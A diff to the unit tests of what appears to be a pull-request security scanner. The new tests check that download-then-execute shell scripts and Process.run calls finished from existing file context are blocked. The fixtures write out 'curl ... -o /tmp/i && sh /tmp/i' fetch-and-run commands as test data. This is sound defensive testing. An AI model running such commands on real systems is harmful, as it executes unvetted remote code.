@@ -504,6 +504,14 @@ class DownloadThenExecute(ScannerTestCase):
         )
         self.assertOrdinary(self.build({}, {"tools/i.sh": script}))
 
+    def test_quoted_execution_target(self):
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", ' "/tmp/i"\n')
+        self.assertBlocked(self.build({}, {"tools/qa.sh": script}))
+
+    def test_quoted_download_target_unquoted_execution(self):
+        script = blocked(f'#!/bin/sh\ncurl -fsSL {self.URL} -o "/tmp/i" && ', "sh", " /tmp/i\n")
+        self.assertBlocked(self.build({}, {"tools/qb.sh": script}))
+
     def test_downloading_data_and_running_an_unrelated_script_is_not_blocked(self):
         """The backreference is what keeps this rule from over-matching."""
         script = (
@@ -514,21 +522,52 @@ class DownloadThenExecute(ScannerTestCase):
         self.assertOrdinary(self.build({}, {"tools/f.sh": script}))
 
 
-class ContinuationFolding(unittest.TestCase):
-    def test_backslash_continuation_is_folded(self):
-        self.assertEqual(scanner.fold_continuations("a \\\n  b"), "a  b")
+class AddedLineMapping(unittest.TestCase):
+    """A match counts only when it overlaps a line the PR added."""
 
-    def test_trailing_pipe_is_folded(self):
-        self.assertEqual(scanner.fold_continuations("a |\n  b"), "a | b")
+    def test_match_inside_an_added_line(self):
+        offsets = scanner._line_index("a\nb\nc\n")
+        self.assertTrue(scanner.touches_added_lines(offsets, frozenset({2}), 2, 3))
 
-    def test_ordinary_newlines_are_preserved(self):
-        self.assertEqual(scanner.fold_continuations("a\nb"), "a\nb")
+    def test_match_entirely_inside_untouched_lines(self):
+        offsets = scanner._line_index("a\nb\nc\n")
+        self.assertFalse(scanner.touches_added_lines(offsets, frozenset({2}), 0, 1))
 
-    def test_additions_are_grouped_per_file_in_order(self):
-        grouped = scanner.group_additions(
-            [("lib/a.dart", "one"), ("lib/b.dart", "x"), ("lib/a.dart", "two")]
+    def test_match_spanning_context_into_an_added_line(self):
+        """The finding-E shape: receiver on an old line, member on a new one."""
+        text = "final e = Process\n  .run;\n"
+        offsets = scanner._line_index(text)
+        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
+        match = rule.search(text)
+        self.assertIsNotNone(match)
+        self.assertTrue(
+            scanner.touches_added_lines(offsets, frozenset({2}), match.start(), match.end())
         )
-        self.assertEqual(grouped, [("lib/a.dart", "one\ntwo"), ("lib/b.dart", "x")])
+        self.assertFalse(
+            scanner.touches_added_lines(offsets, frozenset({9}), match.start(), match.end())
+        )
+
+
+class ConstructCompletedFromContext(ScannerTestCase):
+    """A PR can finish a blocked construct using tokens already in the file."""
+
+    def test_added_fragment_completes_an_existing_receiver(self):
+        base = "class R {\n  static final execute = " + PROCESS_RUN[:7] + "\n  ;\n}\n"
+        head = "class R {\n  static final execute = " + PROCESS_RUN[:7] + "\n  ." + PROCESS_RUN[8:] + ";\n}\n"
+        result = self.build({"lib/r.dart": base}, {"lib/r.dart": head})
+        self.assertBlocked(result)
+        self.assertIn("lib/r.dart", result.reported_paths())
+
+    def test_grandfathered_construct_on_an_untouched_line_is_not_reported(self):
+        """Editing elsewhere in a file that already contains a blocked call."""
+        base = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail\n"
+        head = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail edited\n"
+        self.assertOrdinary(self.build({"lib/t.dart": base}, {"lib/t.dart": head}))
+
+    def test_touching_the_grandfathered_line_itself_is_reported(self):
+        base = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n"
+        head = f"void t() {{\n  {PROCESS_RUN}('y');\n}}\n"
+        self.assertBlocked(self.build({"lib/t.dart": base}, {"lib/t.dart": head}))
 
 
 class FailClosed(ScannerTestCase):
@@ -554,8 +593,7 @@ class FailClosed(ScannerTestCase):
         self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
 
     def test_unresolvable_diff_path_is_reported_as_sensitive(self):
-        additions = [(scanner.UNKNOWN_PATH, "some line")]
-        sensitive, blocked = scanner.classify([], additions)
+        sensitive, blocked = scanner.classify([], [], unresolved_paths=True)
         self.assertTrue(sensitive)
         self.assertFalse(blocked)
 
@@ -836,8 +874,7 @@ class GuardSelfSafety(unittest.TestCase):
     def test_guard_sources_do_not_trip_their_own_blocked_rules(self):
         """Scanned exactly as the guard would scan them: whole file, one block."""
         for source in self.SOURCES:
-            text = source.read_text(encoding="utf-8")
-            block = scanner.fold_continuations(text)
+            block = source.read_text(encoding="utf-8")
             for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
                 match = pattern.search(block)
                 self.assertIsNone(
